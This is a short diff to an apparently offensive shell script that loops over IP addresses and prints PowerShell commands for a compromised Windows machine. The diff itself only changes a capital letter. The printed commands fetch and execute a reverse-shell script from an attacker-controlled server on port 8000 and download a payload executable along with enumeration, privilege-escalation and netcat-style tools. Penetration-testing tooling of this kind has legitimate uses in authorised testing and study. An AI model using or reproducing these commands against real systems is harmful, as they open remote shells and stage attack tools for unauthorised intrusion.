@@ -57,7 +57,7 @@ filename="file.txt"
 while read line
   do 
   echo "\nIf needed:\npowershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/reverseshell.ps1')\""
-  echo "powershell \"iwr -Uri http://$line:8000/winpayload.exe -outfile winpayload.exe\"\n\notherwise:"
+  echo "powershell \"iwr -Uri http://$line:8000/winpayload.exe -outfile winpayload.exe\"\n\nOtherwise:"
   echo "powershell \"iwr -Uri http://$line:8000/PowerShell/jawsenum.ps1 -outfile jawsenum.ps1\""
   echo "powershell \"iwr -Uri http://$line:8000/PowerShell/powerup.ps1 -outfile powerup.ps1\""
   echo "powershell \"iwr -Uri http://$line:8000/PowerShell/powercat.ps1 -outfile powercat.ps1\""
